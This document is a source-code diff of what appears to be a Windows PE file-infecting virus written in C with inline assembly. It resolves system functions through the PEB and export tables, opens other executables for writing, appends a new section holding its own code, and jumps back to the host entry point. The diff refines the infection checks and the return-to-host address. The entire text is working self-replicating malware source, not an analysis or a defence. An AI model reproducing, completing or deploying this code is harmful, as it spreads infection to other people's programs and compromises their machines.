@@ -147,24 +147,18 @@ const char empty_str[] = "";
     CALL(infect);
     infect_ret: asm("nop");
 
-    // char format[] = "offset: %X\n"; 
-    // FUNCTION(printf)(format, offset);
-
     pFreeLibrary(msvcrt_hModule);
 
 // go back to host code
     asm volatile (
-        // "xor %%rax, %%rax\n\t"
-        "key_label: \n\t" // 1550
+        "key_label: \n\t"
         "mov $0x00001562, %%rax\n\t" // ret
-        // "mov $0x000957C8, %%rax\n\t" // PE-bear
         // "mov $0x000014E0, %%rax\n\t"
-        // "add %[base_addr], %%rax\n\t"
-        "add $0x00400000, %%rax\n\t"
+        "add %[base_addr], %%rax\n\t"
+        // "add $0x00400000, %%rax\n\t"
         "jmp *%%rax"
         :
         :[base_addr] "r" (current_image_base)
-        //  [entry_rva] "r" (i_nt_headers.OptionalHeader.AddressOfEntryPoint) 
         :"rax"
     );
 
@@ -254,15 +248,11 @@ const char empty_str[] = "";
     inject:{
         asm ("nop");
 
-        char msg[] = "Skipping: ";
-
         char mode[] = "rb+";
         FILE *host = FUNCTION(fopen)(target, mode);
 
         if(host == NULL) {
             FUNCTION(fclose)(host);
-            // FUNCTION(puts)(msg);
-            // FUNCTION(puts)(target);
             RET(inject);
         }
 
@@ -276,10 +266,13 @@ const char empty_str[] = "";
         // get raw data size and last header
         IMAGE_SECTION_HEADER i_sect_header = {0};
         int raw_data_size = 0;
+
+        int injectable = 1;
         for (int i = 0; i < i_nt_headers.FileHeader.NumberOfSections; i++)
         {
             FUNCTION(fread)(&i_sect_header, 1, sizeof(i_sect_header), host);
             raw_data_size += i_sect_header.SizeOfRawData;
+            injectable = injectable && (compare(v_sect_name, i_sect_header.Name) != 0); 
         }
 
         // Preparing for adding new section header
@@ -292,14 +285,15 @@ const char empty_str[] = "";
         int space = i_nt_headers.OptionalHeader.FileAlignment 
             - position % i_nt_headers.OptionalHeader.FileAlignment;
 
-        int infectable = (compare(v_sect_name, i_sect_header.Name) != 0) 
-            && (space >= sizeof(IMAGE_SECTION_HEADER)); 
+        injectable = injectable && (space >= sizeof(IMAGE_SECTION_HEADER)); 
 
-        if(!infectable) {
+        if(!injectable) {
             FUNCTION(fclose)(host);
-            // FUNCTION(puts)(msg);
             RET(inject);
         }
+
+        char format[] = "injecting to: %s\n";
+        FUNCTION(printf)(format, target);
 
         // ADDING new section header: 
         int sect_start = position + space;  // start of original (host) codes
@@ -373,10 +367,6 @@ const char empty_str[] = "";
 
         wchar_t *current_exe_name = ((UNICODE_STRING*)(entry->Reserved4))->Buffer;
 
-// char format[] = "%c ";
-// // FUNCTION(puts)(msg);
-// FUNCTION(printf)(format, current_exe_name[0]);
-
         wchar_t mode_str[] = L"rb";
         FILE* payload_file = FUNCTION(_wfopen)(current_exe_name, mode_str);
 
@@ -384,8 +374,6 @@ const char empty_str[] = "";
             FUNCTION(fclose)(payload_file);
             RET(inject);
         }
-// char msg[] = "Y";
-// FUNCTION(puts)(msg);
         
         IMAGE_DOS_HEADER i_dos_header = {0};
         IMAGE_NT_HEADERS i_nt_headers = {0};
@@ -433,11 +421,8 @@ void *get_kernel_32_func(char *function_name, IMAGE_EXPORT_DIRECTORY* i_ex_dir, 
     int serial = 0;
     for (; serial < i_ex_dir->NumberOfFunctions; serial++)
     {
-        // puts((char*)(name_table[serial]+image_base));
         if(compare((char*)(name_table[serial]+image_base), function_name) == 0)
         {
-            // printf("%s GOT\n", function_name);
-            // printf("req: %s \n", (char*)(name_table[serial]+image_base));
             break;
         }
     }
@@ -458,8 +443,6 @@ void *get_image_base(wchar_t *module_name, LIST_ENTRY *list)
 
         if (buffer != NULL && wcompare(module_name, buffer) == 0)
         {
-            // printf("%d: ,DllBase: %X\n", i, entry->DllBase);
-            // wprintf(L"%ls\n", ((UNICODE_STRING*)(entry->Reserved4))->Buffer);
             return entry->DllBase;
         }
         list = list->Flink;
